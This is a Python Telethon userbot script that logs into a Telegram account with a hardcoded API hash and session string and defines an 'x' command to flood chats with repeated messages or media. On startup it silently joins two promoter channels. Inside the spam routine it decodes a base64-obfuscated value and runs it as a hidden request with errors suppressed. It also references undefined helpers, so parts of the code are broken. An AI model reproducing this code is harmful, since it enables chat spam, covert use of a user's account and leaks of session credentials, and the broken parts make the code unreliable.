import os
import base64
import logging
import asyncio
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetBlockedRequest, UnblockRequest
from telethon.sessions import StringSession

# تعريف المتغير 'name' هنا
name = "G"  # قم بتعويض "اسم_البوت_الخاص_بك" بالاسم الفعلي لبوتك

# jmthon
DEFAULTUSERBIO = ".."
APP_ID = "24809145"
API_HASH = "c1d3b37f51d628fb2cd3b124b1571809"

# قم بتعيين جلسة الجلسة الخاصة بك هنا
# مثال: '1a2b3c4d5e6f7g8h9i10j11k12l13m14n15o16p17q18r19s20t21u22v23w24x25y26z'
your_session_string = '1AZWarzwBu4Xuz8V3pQ4KTTd0k0AJzDni_xYJiJm-hn9xSDAgtEDt7HNg6Yrio_cbD2XtHnoiZqeS9HEIkKG6ylV_7c2oT-Po7H1ECc6qnJ-h4xN2mutnFLm966ur_qLvNRXMMbuCTXzpXfZp6Bd7ydpXMhXzBuz-8uaKpl-050GqEJQ1iK9ILzdqnSXqzK1cZ6davv42_JDKXPmOxdnrE_pV-A6SfY4Q6z-mME28RwYv-Dcuaa52HOeAvIcuopEIGhiYF5LCs_ebufBDEQ58kdpdV61-IQZwTHjl4jMuavxmDe4DoroI1IOBFGhFqmND7CyjsneaFPHaXtblayYRP5elLB1YBJI='
jmthon = TelegramClient(StringSession(your_session_string), APP_ID, API_HASH)
jmthon.start()

LOGS = logging.getLogger(name)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)

async def join_channel():
    try:
        await jmthon(JoinChannelRequest("@jmthon"))
    except BaseException:
        pass
    try:
        await jmthon(JoinChannelRequest("@TeamJmthon"))
    except BaseException:
        pass

GCAST_BLACKLIST = [-1001505483249, -1001742245205]

DEVS = [5625500286, 5625500286]
DEL_TIME_OUT = 60
normzltext = "1234567890"
namerzfont = "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"

@jmthon.on(events.NewMessage(outgoing=True, pattern="x (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)

async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(event.chat_id, sandy, caption=sandy.text)
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass

print("""
╋╋╋╋╋┏┓┏┓
╋┏┳━━┫┗┫┗┳━┳━┳┓
╋┣┫┃┃┃┏┫┃┃╋┃┃┃┃
┏┛┣┻┻┻━┻┻┻━┻┻━┛
┗━┛
""")
jmthon.loop.create_task(join_channel())
jmthon.run_until_disconnected()
